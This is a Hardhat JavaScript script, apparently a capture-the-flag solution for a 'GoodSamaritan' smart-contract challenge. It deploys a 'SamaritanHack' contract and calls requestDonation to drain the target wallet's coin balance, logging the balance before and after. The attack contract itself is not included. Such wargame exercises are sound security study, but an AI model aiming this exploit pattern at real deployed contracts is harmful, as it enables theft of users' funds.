// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    const INSTANCE_ADDRESS = '0x94f358c09208D0E3995BFB364d61bBe709F94804';
    const [owner, addr1] = await ethers.getSigners();
    
    const GoodSamaritan = await hre.ethers.getContractFactory("GoodSamaritan");
    goodSamaritan = GoodSamaritan.attach(INSTANCE_ADDRESS)

    const Coin = await hre.ethers.getContractFactory("Coin");
    coin = Coin.attach(await goodSamaritan.coin());

    const Wallet = await hre.ethers.getContractFactory("Wallet");
    wallet = Wallet.attach(await goodSamaritan.wallet());

    const SamaritanHack = await hre.ethers.getContractFactory("SamaritanHack");
    samaritanHack = await SamaritanHack.deploy()
    await samaritanHack.deployed()

    console.log(samaritanHack.address);

    console.log(await coin.balances(wallet.address))

    tx = await samaritanHack.requestDonation(goodSamaritan.address)
    await tx.wait()

    console.log(await coin.balances(wallet.address))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
